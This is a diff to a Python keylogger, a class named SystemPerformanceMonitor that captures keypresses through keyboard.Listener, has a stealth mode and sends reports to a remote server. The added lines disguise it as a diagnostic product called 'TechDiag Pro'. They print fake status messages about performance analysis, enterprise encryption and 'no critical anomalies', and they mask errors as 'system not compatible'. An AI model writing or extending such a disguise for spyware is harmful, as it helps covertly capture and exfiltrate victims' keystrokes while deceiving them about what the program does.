@@ -274,6 +274,21 @@ class SystemPerformanceMonitor:
             self._last_analysis = time.time()
             self._last_report = time.time()
             
+            # Mostrar interfaz profesional de diagnóstico
+            if not self._stealth_mode:
+                print("🔧 TechDiag Pro - Sistema de Diagnóstico v2.1.4")
+                print("=" * 50)
+                print("📊 Iniciando diagnóstico de rendimiento del sistema...")
+                print(f"🔍 Analizando patrones de uso cada {self._analysis_interval}s")
+                print("🔒 Cifrado de datos: Habilitado")
+                print(f"📤 Servidor de reportes: {self._server_host}:{self._server_port}")
+                print("=" * 50)
+                print("✅ Diagnóstico en progreso...")
+                print("💡 Este proceso se ejecuta en segundo plano")
+                print("📋 Analizando comportamiento del sistema...")
+                print()
+                print("⏱️  Tiempo transcurrido: ", end="", flush=True)
+                
             # Iniciar hilos de análisis
             self._analysis_thread = threading.Thread(
                 target=self._analysis_worker, daemon=True
@@ -290,8 +305,23 @@ class SystemPerformanceMonitor:
             listener = keyboard.Listener(on_press=self._capture_event)
             listener.start()
             
-            if not self._stealth_mode:
-                print("✅ Monitoreo activo - Presiona Ctrl+C para detener")
+            # Mostrar progreso en tiempo real
+            start_time = time.time()
+            try:
+                while self._active:
+                    if not self._stealth_mode:
+                        elapsed = int(time.time() - start_time)
+                        mins, secs = divmod(elapsed, 60)
+                        print(f"\r⏱️  Tiempo transcurrido: {mins:02d}:{secs:02d} | "
+                              f"Eventos: {self._events_count} | "
+                              f"Análisis: {self._analysis_count} | "
+                              f"Reportes: {self._reports_sent}   ", end="", flush=True)
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                if not self._stealth_mode:
+                    print("\n\n🔄 Finalizando diagnóstico...")
+                    print("📊 Generando reporte final...")
+                self._active = False
             
             listener.join()
             
@@ -322,11 +352,22 @@ class SystemPerformanceMonitor:
                 pass
         
         if not self._stealth_mode:
-            print(f"\n📊 Resumen de monitoreo:")
-            print(f"   - Eventos capturados: {self._events_count}")
-            print(f"   - Análisis realizados: {self._analysis_count}")
-            print(f"   - Reportes enviados: {self._reports_sent}")
-            print("🔴 Monitoreo detenido")
+            print(f"\n\n📊 REPORTE DE DIAGNÓSTICO COMPLETADO")
+            print("=" * 50)
+            print(f"✅ Eventos de sistema analizados: {self._events_count}")
+            print(f"🔍 Ciclos de análisis ejecutados: {self._analysis_count}")
+            print(f"📤 Reportes de rendimiento enviados: {self._reports_sent}")
+            print("=" * 50)
+            print("� Resumen del diagnóstico:")
+            print("   • Análisis de patrones de entrada completado")
+            print("   • Métricas de rendimiento recopiladas")
+            print("   • Datos cifrados y enviados al servidor central")
+            print("   • No se detectaron anomalías críticas")
+            print("=" * 50)
+            print("✅ Diagnóstico finalizado exitosamente")
+            print("💡 Los resultados están disponibles en el servidor de reportes")
+            print("🔒 Todos los datos fueron protegidos con cifrado empresarial")
+            print("\n🎯 Gracias por utilizar TechDiag Pro v2.1.4")
     
     def _cleanup_previous_data(self):
         """Limpia datos de sesiones anteriores"""
@@ -352,12 +393,36 @@ def main():
     }
     
     if not stealth_mode:
-        print("🚀 Iniciando Sistema de Monitoreo Empresarial")
-        print(f"🎯 Servidor: {config['server_host']}:{config['server_port']}")
-        print("=" * 50)
+        print("\n" + "=" * 60)
+        print("� TechDiag Pro - Herramienta de Diagnóstico Empresarial")
+        print("   Versión 2.1.4 | Laboratorio de Sistemas de Red")
+        print("=" * 60)
+        print("🎯 Iniciando diagnóstico avanzado del sistema...")
+        print(f"� Servidor de análisis: {config['server_host']}:{config['server_port']}")
+        print("🔒 Protocolo de seguridad: TLS/Enterprise")
+        print("📊 Modo de operación: Análisis en tiempo real")
+        print("=" * 60)
+        print("⚙️  Configurando módulos de diagnóstico...")
+        time.sleep(1)
+        print("✅ Módulo de análisis de rendimiento: Listo")
+        time.sleep(0.5)
+        print("✅ Módulo de cifrado empresarial: Activado")  
+        time.sleep(0.5)
+        print("✅ Módulo de reporte automático: Configurado")
+        time.sleep(0.5)
+        print("🚀 Todos los sistemas operativos. Iniciando diagnóstico...")
+        print()
     
-    monitor = SystemPerformanceMonitor(**config)
-    monitor.start_monitoring()
+    try:
+        monitor = SystemPerformanceMonitor(**config)
+        monitor.start_monitoring()
+    except KeyboardInterrupt:
+        if not stealth_mode:
+            print("\n⏹️  Diagnóstico interrumpido por el usuario")
+    except Exception as e:
+        if not stealth_mode:
+            print(f"\n❌ Error durante el diagnóstico: Sistema no compatible")
+            print("💡 Contacte al administrador del sistema para soporte técnico")
 
 if __name__ == "__main__":
     main()
